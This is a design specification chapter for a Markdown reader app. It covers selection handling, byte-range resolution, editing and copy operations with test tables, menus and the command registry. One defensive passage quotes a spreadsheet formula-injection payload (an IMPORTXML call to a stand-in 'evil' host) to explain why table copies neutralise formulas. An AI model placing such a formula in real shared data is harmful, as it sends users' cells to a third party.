# 03 — Selection and operations

How a reader points at something in Rendered mode, how that becomes bytes, and the four v1
operations, each with its algorithm and its test table. Contracts: `operation.ts` (frozen).
Buffer: §01. DOM provenance: §02.

## Selection model (D-A2)

```ts
export type Selection =
  | { kind: 'none' }
  | { kind: 'node'; node: Block | Inline; el: Element }        // one AST node
  | { kind: 'section'; heading: Heading; range: Source }       // heading + everything until the next heading of ≤ level
  | { kind: 'document' }
  | { kind: 'text'; text: string };                            // a native DOM text selection; copy only, never mutates
```

- **Click on a block** (`closest('[data-marxy-s]')` that is block-level) selects that node.
  Click on an inline `code` selects the inline node; a second click on the same element
  selects its enclosing block. A plain click on a link **follows it** (§02 post-pass 2: a
  reader clicks links to go somewhere); `Alt+click` selects the link node instead. A click on a
  task checkbox toggles it (§02 post-pass 7) and does not change the selection. A click that
  ends a native text drag is not a selection click. Click on empty article space → `none`.
- **Outline** (§09) selects a `section`. `Alt+Up/Down` moves a node selection to the
  previous/next block sibling; `Alt+Shift+Up` selects the parent block; `Esc` → `none`.
  (`Alt+Left/Right` are history back/forward on Linux, as MARXY-86's `keys.ts` binds them.)
- **Native text selection** (drag) is `text`; it never resolves to bytes in v1. Copy of a
  `text` selection copies the DOM text (with smart typography, as seen).
- **Rendering:** the selected element gets `class="marxy-selected"` (a theme-owned outline
  colour on the block's left edge; no fill). Only one selection exists at a time.

**Resolution.** Split by what each half needs: the AST half is pure and lives in core, the DOM
half in the app.

```ts
// packages/core/src/sourcemap/section.ts — pure, Node-testable over the corpus
export function sectionRange(doc: Document, heading: Heading): Source;
export function nodeAt(doc: Document, byte: number): Block | null;          // the innermost block whose range contains byte
// apps/desktop/src/selection/resolve.ts — needs a DOM
export function resolve(el: Element, map: NodeMap): { node: Node; range: Source } | null;
```

**Why `text` never resolves (and what MARXY-41's acceptance means by "span").** The frozen
contract names a `span` applicability, and the CSV's MARXY-41 row asks that "span, block,
section and document selections resolve to ranges whose bytes match the selected text". A DOM
text selection cannot do that honestly in v1: smart typography (§02) and the typesetter's soft
hyphens make the painted characters differ from the source, and a drag that starts inside a
link and ends inside a code span has no byte range that is "the selected text" in both
directions. v1 therefore resolves **node, section and document** selections and treats a DOM
drag as `text` (copy only). No v1 operation declares `'span'`; the contract keeps the word for
later. The property test is stated over what does resolve:

> For every element carrying provenance in every corpus document: `resolve(el)` returns the
> node whose `src` is `{s, e}`; `textOf(buffer, range)` is at UTF-8 boundaries; re-parsing that
> slice alone yields a first top-level node of the same `type` (blocks) or a paragraph whose
> only child has that `type` (inlines). For every heading: `sectionRange` starts at the heading
> and ends at the next heading of equal or higher rank or at the end of the document.

`sectionRange` = `[heading.src.start, next.src.start)` where `next` is the first later
top-level block that is a heading with `level <= heading.level`, else `doc.src.end`. Trailing
blank lines belong to the section (they are inside the range); operations that copy trim them.

## Applying an operation

```ts
export async function apply(op: Operation, sel: Selection, ctx: AppContext): Promise<void>
```

1. `input = { document, node, range, text: textOf(buffer, range) }`; `op.canApply(input)` must
   be true (the palette only offered it because it was).
2. `result = op.run(input)`. If `result.clipboard`, `shell.clipboardWrite(result.clipboard)`.
3. If `result.replacement !== input.text`: `history.push({ range, before, after, label: op.title })`,
   `buffer = splice(buffer, range, result.replacement)`.
4. Reparse, re-render (§02) with `policyFor(trust.grantsFor(path))` (§12), **restore** reading
   position (§08) and selection: the selection is re-resolved by `range.start` (the node that
   now starts at the same byte, else `none`).
5. Typeset re-runs with the paragraph cache (§04); unchanged paragraphs are instant.
6. `result.summary`, if present, shows as a transient notice for 4 s ("Table aligned: 6 rows").

Budget: steps 3–5 under 100 ms for a 200 KB document (the live-reload budget, same path).

## The four operations (`packages/core/src/operations/`)

Each is one file exporting one `Operation`; `index.ts` exports `OPERATIONS: readonly Operation[]`
in palette order. All pure; all table-tested; the fidelity property runs every operation at every
applicable node of every corpus file and asserts bytes outside `range` are unchanged.

### `copy-section` — applies to `section`, `document`

`clipboard.text = textOf(range).replace(/\s+$/, '') + '\n'`; `replacement = text` (no change).
For `document`, the whole buffer text. Also sets `clipboard.html` to
`renderDocumentSafeHtml(parseMarkdown(clipboard.text)).html` so pasting into a rich target keeps
structure (the same sanitised pipeline; nothing new to trust).

| Case | Expect |
| --- | --- |
| h2 followed by h3, h3, h2 | range ends at the second h2's start; text includes both h3 sections |
| last section of the file | range ends at `doc.src.end`; trailing newline normalised to exactly one |
| h1 with nested h2s | includes all of them |
| heading with trailing `##` closers | copied text is the source bytes, closers included |

### `copy-code-clean` — applies to `block` where `node.type === 'codeBlock'`

`clipboard.text = node.value` (the content between the fences, as the parser stores it). Do not
append a newline the source did not have, and do not strip one the source did have. A one-line
fence copies with no trailing newline. No `clipboard.html`. `replacement = text`.

| Case | Expect |
| --- | --- |
| fenced ` ```ts ` with info string | value only; no fence, no info string |
| indented code block | value with the 4-space indent removed (already so in the AST) |
| unclosed fence at EOF | value = everything after the opening fence |
| empty block | `''` |
| one-line fence whose value has no trailing newline | that value, not the value plus `\n` |

### `toggle-task` — applies to `block` where the node is a `taskMarker` (or a `listItem` with one)

`range = marker.src` (exactly the `[ ]` / `[x]` bytes, 3 bytes). `replacement = marker.checked ? '[ ]' : '[x]'`.
When invoked on a `listItem`, use its first child marker. `summary` = none (the change is visible).

| Case | Expect |
| --- | --- |
| `- [ ] a` | bytes 2..5 become `[x]`; everything else identical |
| `* [X] b` | becomes `[ ]` (case is not preserved: `X` and `x` are the same marker) |
| `1. [x] c` | becomes `[ ]` |
| nested item under a task | only the clicked marker's bytes change |
| marker inside a code block (not a task) | `canApply` false |
| CRLF file | no line ending touched (the range is inside the line) |

### `align-table-pipes` — applies to `block` where `node.type === 'table'`

Rewrites the table's lines so every column's pipes align. `range = table.src`.

Algorithm, on `text = textOf(range)`:

1. Split into lines keeping each line's own ending (`/\r?\n/` positions; the last line may
   have none). Every line of a GFM table is one row; there are no continuation lines.
2. For each line, split into cells on **unescaped** `|` (a `|` not preceded by an odd run of
   `\`); a leading `|` and a trailing `|` (after trimming trailing spaces) are *delimiters*,
   not cells; record whether the row had them (`leading`, `trailing`). Cell text is trimmed.
3. Column count = max cells over rows; short rows are padded with empty cells.
4. Display width of a cell = sum over grapheme clusters (`Intl.Segmenter`, `'grapheme'`):
   0 for combining marks (`\p{M}`), 2 for East Asian Wide and Fullwidth (ranges:
   `ᄀ–ᅟ`, `⺀–꓏`, `가–힣`, `豈–﫿`, `︰–﹏`,
   `＀–｠`, `￠–￦`, `\u{1F300}–\u{1FAFF}`, `\u{20000}–\u{3FFFD}`), else 1.
   Escaped pipes `\|` count 2 (they are two characters in the source).
5. Column width = max display width in the column, minimum 3 (the alignment row needs `---`).
6. Rebuild: cells padded with spaces to the column width, one space padding inside each pipe,
   `leading`/`trailing` pipes as the row originally had them. The alignment row keeps its
   colons: `:---`, `---:`, `:--:` stretched to the column width.
7. Rejoin with each line's original ending. If the result equals the input, `replacement = text`.

`summary = "Aligned N columns across M rows"`.

| Case | Expect |
| --- | --- |
| ragged widths | pipes aligned; content unchanged |
| `a \| b` escaped pipe in a cell | stays escaped; counted as width 2 |
| inline code `` `x|y` `` | the `|` splits the cell (GFM semantics); output identical to input semantics |
| CJK cell (`07-cjk.md` table) | wide characters counted 2; pipes align in a monospace column |
| row without leading pipe | rebuilt without leading pipe |
| alignment row `:---:` | becomes `:----:` at width 6 |
| CRLF table | every line keeps `\r\n` |
| 40-row pathological table | completes in < 5 ms |

## The operations of Phase E (`packages/core/src/operations/`)

Added after the four above, each one file (or one file per family) in `OPERATIONS`, each with its own table of cases
in its test, so they are not repeated here. All are `string → string` over one range, held by the same fidelity
property and by `assertMinimalDiff` against the bytes each means to change (`operations/testing/test-kit.ts`).

| Id | Applies to | What it changes |
| --- | --- | --- |
| `unwrap-markdown-fence` | a `markdown` or `md` fenced block | the two fence lines go; every content byte stays |
| `promote-heading`, `demote-heading` | a heading (its section is the range) | the `#` run of the heading and of each sub-heading, one level |
| `move-section-up`, `move-section-down` | a heading, with both sections it trades as the range (`sectionSwapOf`) | nothing is rewritten: the two sections change places, each with its own bytes; if the second ends with no line ending (the last section of a file with none) the first one's line endings come between them, so the file ends as it did (W-10) |
| `renumber-list`, `list-to-numbers`, `list-to-bullets`, `bullets-from-glyphs` | a list; a paragraph of glyph bullets | the marker bytes, and the continuation lines' indent where a marker's width moved |
| `sort-list-items` | a list | the order of the top-level items, A to Z, each carrying its own bytes |
| `format-json`, `format-yaml` | a fenced `json` or `yaml` block | the whitespace of the block's content, two spaces per level |
| `dedupe-lines` | a run of blocks (`Shift+click`) | a line that repeats an earlier one is removed; the first stays |

Which of them the verb menu shows is the table under *Default verbs*, in `MENU_ORDER`; today only `dedupe-lines`
(on a block), `toggle-task` and `align-table-pipes` have a row, and the rest are reached from the palette's `>`
list. The phase's screen criterion, which composes paste, unwrap, a task click and an edit in place on LF and CRLF
files, is `apps/desktop/test/phase-e-flow.test.mjs`.

## Default verbs and the verb menu (ADR-0054)

One menu is the click surface for operations, and `Mod+C` runs a default copy verb. Both read one
table, `apps/desktop/src/selection/verbs.ts`, so the order is written in one place.

**Selection kinds.** A drag is `text`. The document is `document`. A section, or a heading node, is
`section`. A `codeBlock` is `code`. A `table`, `tableRow` or `tableCell` is `table`. A task
`listItem`, or a paragraph whose parent `listItem` has a task marker, is `task`. Any other block is
`block`; an inline node is `inline`.

**Derived selections (ADR-0061, ADR-0071).** A selection in a derived view is a `DerivedNode`, never a `Node`, so
no operation's `canApply` sees it and nothing it resolves to reaches a splice. ADR-0061 names `turn`, `tool` and
`derived-text` (K-12 adds their rows). ADR-0071 adds **`cell`**, built by K-10b: a click on a cell of the CSV or TSV table
lens selects it.

- **Bytes.** A `cell` resolves to the whole raw field, quotes included, delimiter and record terminator excluded: for
  `a,"x ""y""",b` the middle cell's range is the 9 bytes `"x ""y"""`. An empty field resolves to its empty range; an
  absent cell (a short row) has no bytes and offers the row's verbs only.
- **Copy.** `⌘C` copies the cell's decoded value (`x "y"`) as plain text, one pasteboard item, no HTML and no formula
  prefix: it is the text the reader is reading. In a CSV the raw field is the *Copy as* target **Source field (CSV)**,
  and a menu row. A TSV field is never decoded (TSV has no quoting; ADR-0071 item 1): its value is its bytes between
  tabs, a leading `"` reads as written, and the cell is never marked. A cell whose decoding collapsed a `""` carries `data-marxy-decoded` and a mark visible at rest.
- **Menu.** Copy · Copy as… · Source field (CSV) · Column stats · Sort by this column · Jump to source · Open in Source.
  The stats and the sort read; the sort orders the view, never the file. Transform may run on the value with its result
  to the sheet or the clipboard, never Apply. No operation, no edit of a cell, no Source for one block.
- A drag inside the grid is `derived-text` and copies what it covers as displayed.
- **Copy as on a cell** (`⇧⌘C`, K-10b): *Value (plain text)*, *Source field (CSV)* (a CSV only), *Table as TSV* and *Table
  as CSV*. The two table targets copy the grid as shown (row 1 when it is the header, then the rows in the view's order; an
  unreadable row is its raw line in one cell; an absent cell is empty) and guard every formula as the table copies below do.
- **Where it is built:** `packages/core/src/data/delimited.ts` (the deriver, `decodeCsvField`, `checkTableInvariants`),
  `packages/core/src/data/table-view.ts` (the sliced sort and stats), `apps/desktop/src/kinds/table-lens.ts` (the grid, the
  selection, its copies and menus) and `apps/desktop/src/commands/data.ts` (*Table view*, *Column stats*).

**Widening.** A click on a table cell offers the table's verbs, and a click on a task item's text
offers "Toggle task". The node's own operation input is tried first, then the enclosing `table` or
`listItem`; the palette and the keyboard share the rule.

**The tables.** `MENU_ORDER` is the order of the menu (at most seven rows, then "All actions…" when
more apply). `COPY_DEFAULT` lists the candidates for `Mod+C`, the first registered and applicable
wins; every id in it is clipboard-only. `MARKDOWN_COPY` is the same, exact markdown; since J-04 no key runs it
(`Mod+Shift+C` opens Copy as, below), and the Copy as menu's Markdown row writes the same bytes. Ids of
operations not yet registered are skipped.

| Kind | `MENU_ORDER` | `COPY_DEFAULT` | `MARKDOWN_COPY` |
| --- | --- | --- | --- |
| text | `selection.copy-rich`, `selection.copy-plain`, `selection.copy-markdown` | `selection.copy-rich` | `selection.copy-markdown` |
| code | `op.copy-code-clean`, `op.copy-command`, `op.copy-source`, `op.copy-rich`, `view.jump-to-source` | `op.copy-code-clean` | `op.copy-source` |
| table | `op.copy-table-tsv`, `op.copy-table-csv`, `op.copy-table-json`, `op.copy-source`, `op.copy-rich`, `op.align-table-pipes` | `op.copy-table-tsv`, `op.copy-source` | `op.copy-source` |
| section | `op.copy-section`, `op.copy-rich`, `op.copy-plain`, `op.extract-tasks`, `op.extract-code-blocks`, `op.extract-links`, `view.jump-to-source` | `op.copy-section` | `op.copy-section` |
| document | `op.copy-section`, `op.copy-plain`, `op.extract-tasks`, `op.extract-code-blocks`, `op.extract-links` | `op.copy-section` | `op.copy-section` |
| task | `op.toggle-task`, `op.copy-rich`, `op.copy-plain`, `op.copy-source`, `view.jump-to-source` | `op.copy-rich`, `op.copy-source` | `op.copy-source` |
| block | `op.copy-rich`, `op.copy-plain`, `op.copy-source`, `op.dedupe-lines`, `view.jump-to-source` | `op.copy-rich`, `op.copy-source` | `op.copy-source` |
| inline | `op.copy-source`, `view.jump-to-source` | `op.copy-source` | `op.copy-source` |

**Table copies carry no live formula.** Marxy opens untrusted documents, and a cell such as `=IMPORTXML("https://evil/?q="&A2,"//a")` pasted into Sheets would run and send the neighbouring cells to a third party, which the reader never asked for (private by default). The TSV text, its HTML and the CSV therefore prefix one `'` to a cell that starts with `=`, `@`, a tab or a carriage return (OWASP's list; the TSV and its HTML flatten those two to a space first), or with `+` or `-` unless the whole cell is a plain number (`-5`, `+1`, `-0.5`, `-1e3` stay as they are). Faithful-to-the-bytes is about the document; this is a derived payload whose purpose is a spreadsheet. The cost is a leading apostrophe on the rare `=`, `@` or `+text` cell, which Sheets and Excel treat as a text marker. JSON and "Copy as plain text" are not formula contexts and stay faithful.

**Reading the tables.** The `selection.` prefix on the `text` kind is deliberate: those three commands act on a drag's DOM range, not on a node through an operation's `canApply`, so they are app commands rather than `op.*`. `op.copy-plain` and `op.copy-rich` are applicable to any `block`, `section` or `document` selection (a node with a source range, never a drag). `verbKindOf` yields `inline` only when a selection resolves to an inline node (a link or emphasis the reader selected with Alt+click); selection resolution mostly yields blocks, so `inline` is rare.

**Rich copy of a drag.** `selection.copy-rich` writes sanitised HTML and plain text in one clipboard
write: the cloned range loses the invisible-glyph, link-destination and break marks, soft hyphens and
every attribute except `href`, `title`, `alt`, `colspan`, `rowspan` and `start`, then passes the core
sanitiser. `selection.copy-markdown` copies the bytes from the first to the last top-level block the
range touches.

**Copy as (J-04, ADR-0065 item 1).** `Mod+Shift+C` opens a menu at the pointer for the selection, else the block
under the pointer (selected as a click would select it), else the document; in Source it copies the selected text,
else the file. The rows are core's `COPY_TARGETS` (`operations/copy-as.ts`, the one place that names them):
Markdown, Plain text, Rich text, HTML source, Slack, Jira wiki, JSON string, Quote with source. A target whose
transform is not built (`NOT_YET`) is not offered, so the menu is whatever the transform registry can run. The
row `copy_format` (§11) names is first and has focus. A choice writes **one pasteboard item** holding every
representation the target needs (plain text always, HTML for rich text only) through `clipboardWriteItem`, and says
one notice, "Copied as Slack, 1.2 KB" (format and the size of the text). Every other copy verb writes the same way,
through `commands/copy-write.ts`; where the shell has no native pasteboard the same copy goes through
`clipboardWrite` and the notice is unchanged. Nothing is read from the pasteboard.

**The menu.** Opened by right-click, `ContextMenu` / `Shift+F10`, or `Enter` on a selection (§09).
A `div.marxy-verb-menu` with `role="menu"`, labelled with the selection ("Code block, json"), rows
with `role="menuitem"` showing the chord. Built on open and removed on close. ArrowUp and ArrowDown
wrap, `Enter` runs, `Escape` closes and keeps the selection, a click outside or a scroll closes. The
page never shows WebKit's own context menu. Every verb in a menu is also in the palette's `>` list.
A hover glyph, a gutter handle and a selection popover are rejected (ADR-0054).

**Transform (W-21, ADR-0065 item 4).** Every entry of core's `TRANSFORMS` is a command, `transform.run.<id>`
("Transform: Sort lines"), run on the selection else the document, in Rendered and in Source. It opens the result sheet
(§09 "Transform and the result sheet"), which copies the result (one pasteboard item), opens it as a new document, adds
another step, or applies it. Apply replaces the *input range* and nothing else: in Rendered it is one `store.apply`
(one history entry, refused untouched when the document changed since the sheet read it), in Source one CodeMirror
transaction (`replaceRange`). It is offered for `edit` transforms only (`Transform.kind`, `transforms/types.ts`).
The `edit` kind's promise (line endings and BOM kept) is the registry's; Apply adds the document's own ending to a
result that has none to follow. This is the one place an operation's input can be a drag's blocks: a transform on a
drag is on those blocks' bytes, as Copy as Markdown is.

**Replace (V-03), an edit as a transformation.** Source only: `Mod+Alt+F` (`view.replace`, "Replace" in the palette) opens
the find panel with its replace field. Rendered has no replace (it has no caret, and a replacement would reshape what is
being read). The panel is CodeMirror's, rebuilt so two of its buttons are Marxy's (`source/replace-sheet.ts`): *Replace*
changes the current match and selects the next, one undo step each; *Replace all…* changes nothing at once and opens a
preview, a modal on the result sheet's classes: every change as a before-and-after line with its line number, the count
("37 replacements on 21 lines"), *Apply* (`Mod+Return`) and *Cancel* (Esc). Past 2,000 changes the preview shows the
first 200 and says how many more; Apply still makes them all. The change set is pure (`source/replace.ts`
`planReplace`) and is the only thing Apply uses: the regular expression runs over the editor's text with `gmu` (and `i`
unless Match case), `$1`, `$<name>`, `$&`, `` $` ``, `$'` and `$$` expand as `String.prototype.replace` expands them,
matches never overlap and an empty match (`^`, `\b`) is stepped past, so a replacement that holds the query is made once.
A match never splits the CR and LF of a CRLF a mixed-ending file holds inside a line; a match whose replacement is the
text already there is no change and is not counted. Apply is one CodeMirror transaction (`isolateHistory`), one undo
step, written in the file's own line ending (a `\n` typed in the replacement is the file's ending); above 5,000 changes
it is one change over the stretch from the first to the last, the same bytes faster. Apply refuses, changes nothing and
says so (in the preview and as a refusal notice) when the editor's text is not the one the preview was made from (an
edit, or the file reloaded from disk) or a change on disk arrived while unsaved edits kept it out (`conflict()`); it does
not re-preview, and the reader runs Replace all again. Apply never writes to disk.

## Palette integration (§09)

`OPERATIONS.filter(op => op.canApply(input))` for the current selection; each entry shows
`title` and, for copy operations, a `⌘C`-style hint. `Enter` applies. After a mutation the
palette closes; after a copy it closes and the notice says "Copied".

## The command registry (`apps/desktop/src/commands/`)

Operations are pure and live in core; everything else a reader can *do* (save, find, outline,
switch mode, revoke a grant, about) is app code. The palette's operations section and the
keyboard map read **one list**, so a command cannot be reachable by key and invisible in the
palette, or the reverse (MARXY-48's keyboard-completeness audit is then a test over this list):

```ts
// apps/desktop/src/commands/registry.ts
export interface Command {
  readonly id: string;                         // 'save', 'find.open', 'op.toggle-task', 'trust.revoke-html', 'about'
  readonly title: string;                      // palette text, sentence case, no trailing period
  readonly key?: string;                       // the §09 keyboard-map string, e.g. 'Mod+S'; absent = palette only
  readonly group: 'document' | 'selection' | 'view' | 'app' | 'transform';   // 'transform' (W-21): the palette lists it last
  readonly listed?: false;                     // false: a door with no palette row of its own (transform.open, the toolbar's)
  when(ctx: AppContext): boolean;              // cheap; evaluated on every palette open
  run(ctx: AppContext): Promise<void>;
}
export function fromOperation(op: Operation): Command;   // id 'op.<op.id>', group 'selection', when = canApply on the current selection, run = apply (above)
export function commands(): readonly Command[];          // the concatenation below, in palette order
```

Each feature owns one file that exports its commands (`commands/document.ts` save and save-as,
`commands/view.ts` mode, find, outline, size, `commands/trust.ts`, `commands/app.ts` about and
quit), and `commands/index.ts` concatenates them with `OPERATIONS.map(fromOperation)`. MARXY-42
creates the registry, the operation adapter and `index.ts`; every later story adds its own file
and one line to `index.ts`. `keys.ts` (MARXY-86) binds by looking up `key` in this list rather
than holding its own table once the registry exists; MARXY-48 moves it over.
